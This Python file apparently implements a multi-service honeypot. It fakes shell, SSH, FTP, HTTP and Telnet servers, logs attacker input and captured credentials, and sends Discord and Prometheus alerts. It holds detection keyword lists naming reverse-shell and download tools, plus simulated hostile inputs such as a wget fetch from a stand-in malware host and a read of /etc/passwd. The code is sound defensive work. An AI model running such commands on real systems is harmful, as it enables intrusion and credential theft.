import socket
import os
import datetime
import json
import threading
import time
import random
import requests
import platform
import logging
from prometheus_client import start_http_server, Counter, Gauge

# Set up logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler("honeypot_system.log"),
        logging.StreamHandler()
    ]
)

# Prometheus Metrics
command_counter = Counter('honeypot_commands', 'Total number of commands executed', ['service'])
login_attempt_counter = Counter('honeypot_login_attempts', 'Total number of login attempts', ['service', 'username'])
alert_counter = Counter('honeypot_alerts', 'Total number of alerts triggered', ['service', 'type'])
active_connections = Gauge('honeypot_active_connections', 'Number of active connections', ['service'])

# Directory to store logs and sessions
os.makedirs("sessions", exist_ok=True)

# Default service ports - using non-standard ports to avoid conflicts with real services
DEFAULT_SHELL_PORT = 9090
SSH_PORT = 2222
FTP_PORT = 2121
HTTP_PORT = 8080
TELNET_PORT = 2323
METRICS_PORT = 9091

BUFFER_SIZE = 1024
WEBHOOK_URL = "yourdescordwebhookhere"  # Replace with your Discord Webhook URL

# Determine OS for command compatibility
system_type = platform.system()

def get_timestamp():
    return datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

def log_activity(ip, input_data, service="shell"):
    with open("honeypot_log.txt", "a") as f:
        f.write("\n=== Activity Detected ===\n")
        f.write(f"Time: {get_timestamp()}\n")
        f.write(f"Service: {service.upper()}\n")
        f.write(f"Client IP: {ip}\n")
        f.write(f"Input: {input_data}\n")

        # Checking for suspicious commands/inputs
        if any(k in input_data.lower() for k in ["wget", "curl"]):
            f.write("[!] File download tool detected.\n")
        if any(k in input_data.lower() for k in ["nmap", "nc", "scan"]):
            f.write("[!] Port scanning or reverse shell attempt.\n")
        if "passwd" in input_data.lower() or "/etc/" in input_data.lower():
            f.write("[!] Attempt to access sensitive file.\n")
        if any(k in input_data.lower() for k in ["bash -i", "python -c", "nc ", "reverse shell"]):
            f.write("[!] Possible reverse shell attempt!\n")
        if any(k in input_data.lower() for k in ["admin", "root", "password"]):
            f.write("[!] Possible credential use detected.\n")
        f.write("--------------------------\n")

def send_alert(ip, message, service="shell"):
    content = f"🚨 Honeypot Alert ({service.upper()}) from IP {ip}: {message}"
    payload = {"content": content}
    try:
        requests.post(WEBHOOK_URL, json=payload)
        alert_counter.labels(service=service, type="discord").inc()
    except Exception as e:
        logging.error(f"[!] Failed to send webhook: {e}")

def simulate_honeypot_activity():
    """Simulate suspicious activity to demonstrate alerts and logging."""
    suspicious_activities = [
        {"service": "ssh", "ip": "192.168.1.100", "data": "Login attempt with username root"},
        {"service": "ftp", "ip": "10.0.0.55", "data": "USER admin"},
        {"service": "shell", "ip": "172.16.0.20", "data": "wget malware.download/payload.sh"},
        {"service": "http", "ip": "45.33.22.11", "data": "GET /wp-admin/install.php HTTP/1.1"},
        {"service": "telnet", "ip": "192.168.0.5", "data": "cat /etc/passwd"},
        {"service": "ssh", "ip": "8.8.8.100", "data": "SSH brute force attempt detected"},
    ]
    
    while True:
        # Simulate a random suspicious activity
        activity = random.choice(suspicious_activities)
        
        # Log and alert on the simulated activity
        log_activity(activity["ip"], activity["data"], activity["service"])
        send_alert(activity["ip"], activity["data"], activity["service"])
        
        # Increment Prometheus counters
        command_counter.labels(service=activity["service"]).inc()
        
        # Add random delay between simulations
        time.sleep(random.uniform(5, 15))

def is_port_available(port):
    """Check if a port is available for binding."""
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.bind(("", port))
            return True
    except OSError:
        return False

def find_available_port(start_port, max_attempts=100):
    """Find an available port starting from start_port."""
    port = start_port
    for _ in range(max_attempts):
        if is_port_available(port):
            return port
        port += 1
    return None

def start_metrics_server():
    """Start Prometheus metrics server with automatic port selection."""
    global METRICS_PORT
    
    if not is_port_available(METRICS_PORT):
        original_port = METRICS_PORT
        METRICS_PORT = find_available_port(METRICS_PORT + 1)
        if METRICS_PORT:
            logging.info(f"Metrics port {original_port} was in use. Using port {METRICS_PORT} instead.")
        else:
            logging.error("Could not find an available port for metrics server.")
            return False
    
    try:
        start_http_server(METRICS_PORT)
        logging.info(f"Prometheus metrics server started on port {METRICS_PORT}")
        return True
    except Exception as e:
        logging.error(f"Failed to start metrics server: {e}")
        return False

def start_server(port_to_try=None, max_retries=10):
    """Start a server with automatic port selection if specified port is in use."""
    if port_to_try is None:
        port_to_try = DEFAULT_SHELL_PORT
    
    current_port = port_to_try
    for attempt in range(max_retries):
        try:
            server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            server.bind(("", current_port))
            server.listen(5)
            return True, server, current_port
        
        except OSError as e:
            if e.errno == 10048:  # Port in use error on Windows
                logging.warning(f"Port {current_port} is already in use, trying next port...")
                current_port += 1
            else:
                logging.error(f"Failed to start server: {e}")
                return False, None, None
    
    logging.error(f"Could not find an available port after {max_retries} attempts")
    return False, None, None

# Shell Honeypot Handler
def handle_shell_client(client_socket, ip, port):
    """Handle the simulated shell honeypot."""
    session_file = os.path.join("sessions", f"shell_{ip.replace('.', '_')}_history.txt")
    history = []
    active_connections.labels(service="shell").inc()

    def send(data):
        client_socket.sendall(data.encode())

    try:
        send("Login: ")
        username = client_socket.recv(BUFFER_SIZE).decode().strip()

        send("Password: ")
        password = client_socket.recv(BUFFER_SIZE).decode().strip()

        log_activity(ip, f"Login Attempt | Username: {username} | Password: {password}", "shell")
        login_attempt_counter.labels(service="shell", username=username).inc()

        send(f"\nAccess granted. Welcome to admin@secure-host (port: {port}):\nType 'help' for available commands.\n\n")

        with open(session_file, "a") as session_log:
            while True:
                send("admin@secure-host:~$ ")
                data = client_socket.recv(BUFFER_SIZE)
                if not data:
                    break
                command = data.decode().strip()
                timestamp = get_timestamp()

                session_log.write(f"#{timestamp}\n{command}\n")
                session_log.flush()

                history.append(command)
                log_activity(ip, command, "shell")
                send_alert(ip, f"Command: {command}", "shell")

                # Increment Prometheus counter
                command_counter.labels(service="shell").inc()

                # Handle commands based on OS type
                if system_type == "Windows":
                    if command == "ls":
                        send("Documents  Downloads  secrets.txt  hr_data.csv\n")
                    elif command == "cat secrets.txt":
                        send("[REDACTED] Passwords and tokens appear encrypted.\n")
                    elif command == "history":
                        for idx, cmd in enumerate(history, 1):
                            send(f"{idx}  {cmd}\n")
                    elif command == "dir":
                        send("C:\\Users\\Admin\\Documents  C:\\Users\\Admin\\Downloads\n")
                    elif command == "help":
                        send("Available commands: ls, dir, cat, help, exit, history\n")
                    else:
                        send("Command not recognized or not permitted.\n")
                else:  # For Linux/macOS
                    if command == "help":
                        send("Available commands: ls, cd, cat, help, exit, history\n")
                    elif command == "ls":
                        send("Documents  Downloads  secrets.txt  hr_data.csv\n")
                    elif command == "cat secrets.txt":
                        send("[REDACTED] Passwords and tokens appear encrypted.\n")
                    elif command == "history":
                        for idx, cmd in enumerate(history, 1):
                            send(f"{idx}  {cmd}\n")
                    else:
                        send("Command not recognized or not permitted.\n")

                # Close the session if 'exit' or 'logout' is typed
                if command in ["exit", "logout"]:
                    send("Session closed.\n")
                    break
    except Exception as e:
        logging.error(f"Error in shell session for {ip}: {e}")
    finally:
        client_socket.close()
        active_connections.labels(service="shell").dec()
        logging.info(f"[-] Shell session from {ip} closed.")

# SSH Honeypot Handler
def handle_ssh_client(client_socket, ip, port):
    """Handle SSH connection and simulate SSH server."""
    session_file = os.path.join("sessions", f"ssh_{ip.replace('.', '_')}_session.txt")
    active_connections.labels(service="ssh").inc()
    
    def send(data):
        client_socket.sendall(data.encode())
    
    try:
        # SSH Banner
        send("SSH-2.0-OpenSSH_8.4p1 Ubuntu-6ubuntu2\r\n")
        
        # Get client's SSH version
        try:
            client_version = client_socket.recv(BUFFER_SIZE).decode('utf-8', errors='ignore').strip()
            log_activity(ip, f"SSH Client Version: {client_version}", "ssh")
        except:
            client_socket.close()
            return
        
        # Record the SSH session
        with open(session_file, "a") as session_log:
            session_log.write(f"=== SSH Session Started at {get_timestamp()} ===\n")
            session_log.write(f"Client IP: {ip}\n")
            session_log.write(f"Client Version: {client_version}\n")
            
            # Ask for username (simplified SSH auth flow)
            send("\r\nUsername: ")
            username = ""
            try:
                username = client_socket.recv(BUFFER_SIZE).decode('utf-8', errors='ignore').strip()
                session_log.write(f"Username attempt: {username}\n")
                log_activity(ip, f"SSH Username: {username}", "ssh")
                login_attempt_counter.labels(service="ssh", username=username).inc()
            except:
                session_log.write("Failed to receive username\n")
                client_socket.close()
                return
            
            # Ask for password
            send("Password: ")
            password = ""
            try:
                password = client_socket.recv(BUFFER_SIZE).decode('utf-8', errors='ignore').strip()
                session_log.write(f"Password attempt: {password}\n")
                log_activity(ip, f"SSH Login Attempt | Username: {username} | Password: {password}", "ssh")
                send_alert(ip, f"SSH Login Attempt: {username}:{password}", "ssh")
            except:
                session_log.write("Failed to receive password\n")
                client_socket.close()
                return
            
            # Simulate authentication failure
            time.sleep(1)  # Add a delay to make it seem more realistic
            send("\r\nAccess denied\r\n")
            session_log.write("Authentication failed\n")
            session_log.write(f"=== SSH Session Ended at {get_timestamp()} ===\n\n")
    except Exception as e:
        logging.error(f"Error in SSH session for {ip}: {e}")
    finally:
        client_socket.close()
        active_connections.labels(service="ssh").dec()
        logging.info(f"[-] SSH session from {ip} closed.")

# FTP Honeypot Handler
def handle_ftp_client(client_socket, ip, port):
    """Handle FTP connection and simulate FTP server."""
    session_file = os.path.join("sessions", f"ftp_{ip.replace('.', '_')}_session.txt")
    active_connections.labels(service="ftp").inc()
    
    def send(data):
        client_socket.sendall(f"{data}\r\n".encode())
    
    try:
        # FTP Banner
        send("220 FTP Server (vsftpd 3.0.3) ready")
        
        username = "anonymous"  # Default username
        
        with open(session_file, "a") as session_log:
            session_log.write(f"=== FTP Session Started at {get_timestamp()} ===\n")
            session_log.write(f"Client IP: {ip}\n")
            
            # Main command loop
            while True:
                try:
                    data = client_socket.recv(BUFFER_SIZE)
                    if not data:
                        break
                        
                    command = data.decode('utf-8', errors='ignore').strip()
                    session_log.write(f"Command: {command}\n")
                    log_activity(ip, f"FTP Command: {command}", "ftp")
                    command_counter.labels(service="ftp").inc()
                    
                    # Handle common FTP commands
                    cmd_upper = command.upper()
                    
                    if cmd_upper.startswith("USER"):
                        username = command[5:].strip()
                        send(f"331 Please specify the password for {username}")
                        login_attempt_counter.labels(service="ftp", username=username).inc()
                    
                    elif cmd_upper.startswith("PASS"):
                        password = command[5:].strip()
                        log_activity(ip, f"FTP Login Attempt | Username: {username} | Password: {password}", "ftp")
                        send_alert(ip, f"FTP Login: {username}:{password}", "ftp")
                        send("530 Login incorrect.")
                    
                    elif cmd_upper == "SYST":
                        send("215 UNIX Type: L8")
                    
                    elif cmd_upper == "FEAT":
                        send("211-Features:")
                        send(" EPRT")
                        send(" EPSV")
                        send(" MDTM")
                        send(" PASV")
                        send(" REST STREAM")
                        send(" SIZE")
                        send(" TVFS")
                        send(" UTF8")
                        send("211 End")
                    
                    elif cmd_upper == "PWD":
                        send("257 \"/\" is the current directory")
                    
                    elif cmd_upper.startswith("CWD"):
                        send("250 Directory successfully changed.")
                    
                    elif cmd_upper == "TYPE":
                        send("200 Switching to Binary mode.")
                    
                    elif cmd_upper == "PASV":
                        send("227 Entering Passive Mode (192,168,1,1,192,84)")
                    
                    elif cmd_upper == "LIST":
                        send("150 Here comes the directory listing.")
                        time.sleep(0.5)
                        send("226 Directory send OK.")
                    
                    elif cmd_upper == "QUIT":
                        send("221 Goodbye.")
                        break
                    
                    else:
                        send("500 Unknown command.")
                
                except Exception as cmd_error:
                    logging.error(f"Error processing FTP command: {cmd_error}")
                    break
            
            session_log.write(f"=== FTP Session Ended at {get_timestamp()} ===\n\n")
    
    except Exception as e:
        logging.error(f"Error in FTP session for {ip}: {e}")
    finally:
        client_socket.close()
        active_connections.labels(service="ftp").dec()
        logging.info(f"[-] FTP session from {ip} closed.")

# HTTP Honeypot Handler
def handle_http_client(client_socket, ip, port):
    """Handle HTTP connection and simulate web server."""
    session_file = os.path.join("sessions", f"http_{ip.replace('.', '_')}_session.txt")
    active_connections.labels(service="http").inc()
    
    try:
        # Receive HTTP request
        request_data = client_socket.recv(BUFFER_SIZE).decode('utf-8', errors='ignore')
        
        with open(session_file, "a") as session_log:
            session_log.write(f"=== HTTP Session at {get_timestamp()} ===\n")
            session_log.write(f"Client IP: {ip}\n")
            session_log.write(f"Request:\n{request_data}\n")
            
            # Log the HTTP request
            log_activity(ip, f"HTTP Request:\n{request_data}", "http")
            command_counter.labels(service="http").inc()
            
            # Parse to get the HTTP method and path
            request_lines = request_data.split('\n')
            if request_lines and len(request_lines[0].split()) >= 2:
                method, path = request_lines[0].split()[:2]
                
                # Check for suspicious paths
                suspicious_paths = ['/wp-admin', '/phpmyadmin', '/.env', '/config', '/admin', '/login', 
                                   '/shell', '/upload', '/.git', '/console', '/xmlrpc.php', '/cgi-bin']
                if any(susp in path.lower() for susp in suspicious_paths):
                    alert_message = f"Suspicious HTTP request: {method} {path}"
                    send_alert(ip, alert_message, "http")
                    session_log.write(f"ALERT: {alert_message}\n")
            
            # Prepare a simple HTTP response
            response = "HTTP/1.1 200 OK\r\n"
            response += "Server: Apache/2.4.41 (Ubuntu)\r\n"
            response += "Content-Type: text/html\r\n"
            response += "Connection: close\r\n\r\n"
            
            # Different content based on path
            if '/login' in request_data:
                response += "<html><head><title>Login</title></head>"
                response += "<body><h1>Login</h1><form method='post'>"
                response += "Username: <input type='text'><br>"
                response += "Password: <input type='password'><br>"
                response += "<input type='submit' value='Login'></form></body></html>"
            elif '/admin' in request_data:
                response += "<html><head><title>Admin</title></head>"
                response += "<body><h1>Admin Portal</h1><p>Access denied</p></body></html>"
            else:
                response += "<html><head><title>Welcome</title></head>"
                response += "<body><h1>Website Under Construction</h1>"
                response += "<p>Please check back later.</p></body></html>"
            
            # Send the response
            client_socket.sendall(response.encode())
            session_log.write(f"Response sent: 200 OK\n")
            session_log.write(f"=== HTTP Session Ended ===\n\n")
    
    except Exception as e:
        logging.error(f"Error in HTTP session for {ip}: {e}")
    finally:
        client_socket.close()
        active_connections.labels(service="http").dec()
        logging.info(f"[-] HTTP session from {ip} closed.")

# Telnet Honeypot Handler
def handle_telnet_client(client_socket, ip, port):
    """Handle Telnet connection and simulate telnet server."""
    session_file = os.path.join("sessions", f"telnet_{ip.replace('.', '_')}_session.txt")
    history = []
    active_connections.labels(service="telnet").inc()
    
    def send(data):
        client_socket.sendall(data.encode())
    
    try:
        # Telnet banner
        send("\r\nUbuntu 20.04.4 LTS\r\n")
        send("login: ")
        
        username = client_socket.recv(BUFFER_SIZE).decode('utf-8', errors='ignore').strip()
        log_activity(ip, f"Telnet Login Username: {username}", "telnet")
        login_attempt_counter.labels(service="telnet", username=username).inc()
        
        send("Password: ")
        password = client_socket.recv(BUFFER_SIZE).decode('utf-8', errors='ignore').strip()
        log_activity(ip, f"Telnet Login Attempt | Username: {username} | Password: {password}", "telnet")
        send_alert(ip, f"Telnet Login: {username}:{password}", "telnet")
        
        # Simulate successful login
        send(f"\r\nWelcome to Ubuntu 20.04.4 LTS ({username}@server).\r\n\r\n")
        
        with open(session_file, "a") as session_log:
            session_log.write(f"=== Telnet Session Started at {get_timestamp()} ===\n")
            session_log.write(f"Client IP: {ip}\n")
            session_log.write(f"Login attempt: {username}:{password}\n")
            
            # Main command loop
            while True:
                send(f"{username}@server:~$ ")
                data = client_socket.recv(BUFFER_SIZE)
                if not data:
                    break
                    
                command = data.decode('utf-8', errors='ignore').strip()
                timestamp = get_timestamp()
                
                session_log.write(f"#{timestamp} Command: {command}\n")
                history.append(command)
                log_activity(ip, command, "telnet")
                send_alert(ip, f"Telnet Command: {command}", "telnet")
                command_counter.labels(service="telnet").inc()
                
                # Handle telnet commands
                if command == "help":
                    send("Available commands: ls, cd, cat, pwd, whoami, uname, exit\r\n")
                elif command == "ls":
                    send("Documents  Downloads  logs  secrets.txt  user_data.csv\r\n")
                elif command == "cat secrets.txt":
                    send("Permission denied\r\n")
                elif command == "pwd":
                    send("/home/user\r\n")
                elif command == "whoami":
                    send(f"{username}\r\n")
                elif command == "uname -a":
                    send("Linux server 5.4.0-107-generic #121-Ubuntu SMP x86_64 GNU/Linux\r\n")
                elif command == "history":
                    for idx, cmd in enumerate(history, 1):
                        send(f"{idx}  {cmd}\r\n")
                elif command in ["exit", "logout"]:
                    send("Connection closed.\r\n")
                    break
                else:
                    send(f"bash: {command}: command not found\r\n")
            
            session_log.write(f"=== Telnet Session Ended at {get_timestamp()} ===\n\n")
    
    except Exception as e:
        logging.error(f"Error in Telnet session for {ip}: {e}")
    finally:
        client_socket.close()
        active_connections.labels(service="telnet").dec()
        logging.info(f"[-] Telnet session from {ip} closed.")

def start_multi_service_honeypot():
    """Start multiple honeypot services with different handlers."""
    services = [
        {"name": "Shell", "port": DEFAULT_SHELL_PORT, "handler": handle_shell_client},
        {"name": "SSH", "port": SSH_PORT, "handler": handle_ssh_client},
        {"name": "FTP", "port": FTP_PORT, "handler": handle_ftp_client},
        {"name": "HTTP", "port": HTTP_PORT, "handler": handle_http_client},
        {"name": "Telnet", "port": TELNET_PORT, "handler": handle_telnet_client}
    ]
    
    running_services = []
    
    for service in services:
        success, server_socket, actual_port = start_server(service["port"])
        if success:
            logging.info(f"[*] {service['name']} honeypot listening on port {actual_port}...")
            service["actual_port"] = actual_port
            service["socket"] = server_socket
            running_services.append(service)
            
            # Start a thread for each service
            thread = threading.Thread(
                target=service_listener, 
                args=(service["socket"], service["handler"], service["name"], actual_port)
            )
            thread.daemon = True
            thread.start()
        else:
            logging.error(f"Failed to start {service['name']} honeypot")
    
    return running_services

def service_listener(server_socket, handler_func, service_name, port):
    """Listen for connections on a specific service."""
    try:
        while True:
            client, addr = server_socket.accept()
            ip = addr[0]
            logging.info(f"[+] {service_name} connection from {ip}")
            thread = threading.Thread(target=handler_func, args=(client, ip, port))
            thread.daemon = True
            thread.start()
    except Exception as e:
        logging.error(f"Error in {service_name} listener: {e}")
    finally:
        if server_socket:
            server_socket.close()

if __name__ == "__main__":
    try:
        print("Starting Multi-Service Honeypot System...")
        print("=====================================")
        
        # Start metrics server
        if not start_metrics_server():
            logging.warning("Failed to start metrics server, continuing without metrics...")
        else:
            print(f"✓ Metrics server running on port {METRICS_PORT}")
        
        # Start all honeypot services
        running_services = start_multi_service_honeypot()
        
        if not running_services:
            logging.error("No services could be started. Exiting.")
            exit(1)
        
        print("\nRunning services:")
        for service in running_services:
            print(f"✓ {service['name']} listening on port {service['actual_port']}")
        
        print("\nMonitoring for connections. Press Ctrl+C to stop.")
        
        # Start the simulation thread if enabled
        simulation_enabled = True  # Set to False to disable simulation
        if simulation_enabled:
            simulation_thread = threading.Thread(target=simulate_honeypot_activity)
            simulation_thread.daemon = True
            simulation_thread.start()
            print("✓ Activity simulation is running")
        
        # Keep the main thread alive
        while True:
            time.sleep(1)
            
    except KeyboardInterrupt:
        print("\nShutting down honeypot system...")
    except Exception as e:
        logging.error(f"Critical error: {e}")